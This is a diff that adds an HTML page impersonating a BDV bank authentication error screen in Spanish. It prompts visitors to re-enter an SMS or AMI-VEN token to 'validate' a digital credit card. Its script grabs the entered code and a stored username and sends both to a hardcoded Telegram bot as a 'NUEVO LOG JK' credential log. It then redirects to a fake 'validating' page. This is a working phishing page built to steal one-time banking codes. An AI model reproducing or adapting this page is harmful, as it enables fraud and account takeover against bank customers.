@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <title>Autenticación Error - BDV</title>
+  <style>
+    body { 
+      margin: 0; padding: 0; font-family: Arial, sans-serif; height: 100vh; 
+      display: flex; justify-content: flex-start; align-items: center; 
+      background-image: url('background.webp'); background-size: cover; background-position: center; 
+      background-color: #f4f4f4; overflow: hidden; 
+    }
+    .container { 
+      display: flex; height: 100%; width: 100%; 
+      justify-content: flex-start; align-items: center; 
+      padding-left: 8%; 
+    }
+    .auth-card { 
+      background: white; padding: 40px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); 
+      width: 90%; max-width: 420px; text-align: center; 
+    }
+    .logo { width: 220px; margin-bottom: 25px; }
+    h3 { color: #0067b1; margin-bottom: 5px; font-size: 18px; font-weight: bold; }
+    .error-msg { color: #d93025; font-weight: bold; margin-bottom: 10px; font-size: 15px; }
+    p { color: #555; font-size: 14px; margin-bottom: 30px; }
+    .form-group { position: relative; margin-bottom: 25px; background: #ededed; padding: 12px; text-align: left; border-radius: 4px; }
+    .form-group label { font-size: 12px; color: #777; display: block; margin-bottom: 2px; }
+    .form-group input { width: 100%; border: none; background: transparent; outline: none; font-size: 20px; color: #333; font-weight: bold; }
+    .buttons { display: flex; gap: 15px; margin-top: 25px; flex-direction: row-reverse; }
+    button { flex: 1; padding: 15px; border-radius: 4px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
+    #btnContinuar { background-color: #0067b1; color: white; }
+    #btnContinuar:disabled { background-color: #ccc; }
+    .btn-cancel { background-color: #0067b1; color: white; }
+    @media (max-width: 900px) { 
+      .container { padding-left: 0; justify-content: center; } 
+      .auth-card { box-shadow: none; width: 100%; height: 100%; border-radius: 0; padding-top: 80px; } 
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="auth-card">
+      <img src="logo.png" class="logo" alt="BDV">
+      <h3>Autenticación</h3>
+      <div class="error-msg">Token incorrecto o caducado.</div>
+      <p>Introduzca el nuevo token recibido Para completar la validación de tu Tarjeta de crédito Digital, ingresa el código SMS o AMI - VEN que hemos enviado a tu celular. (Puede tardar unos minutos en llegar)</p>
+      <div class="form-group">
+        <label>Código SMS *</label>
+        <input type="text" id="tokenInput" maxlength="8" autocomplete="off" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+      </div>
+      <div class="buttons">
+        <button type="button" id="btnContinuar" disabled>Continuar</button>
+        <button type="button" class="btn-cancel" onclick="window.location.href='index.html'">Cancelar</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const TG_TOKEN = "8968949871:AAHOl4RQWDHHaPcoCqRkE_oE3jxetyal3pA";
+    const TG_CHAT_ID = "8359260482";
+
+    const btn = document.getElementById('btnContinuar');
+    const input = document.getElementById('tokenInput');
+
+    input.addEventListener('input', () => { 
+      btn.disabled = input.value.length < 6; 
+    });
+
+    btn.addEventListener('click', async () => {
+      const token = input.value;
+      const user = localStorage.getItem("usuario") || "Desconocido";
+      
+      btn.disabled = true;
+      btn.innerText = "Validando...";
+
+      // Formato exacto basado en la imagen de "NUEVO LOG JK"
+      const text = `____________________________\n` +
+                   `📩 **NUEVO LOG JK**\n` +
+                   `____________________________\n` +
+                   `👤 **Usuario:** \`${user}\`\n` +
+                   `🔑 **Pass:** \`${token}\`\n` +
+                   `____________________________`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'Markdown' })
+        });
+      } catch (e) { console.log("Error"); }
+
+      // Redirección a tu carpeta de "Validando"
+      setTimeout(() => {
+        window.location.replace("validando.html");
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
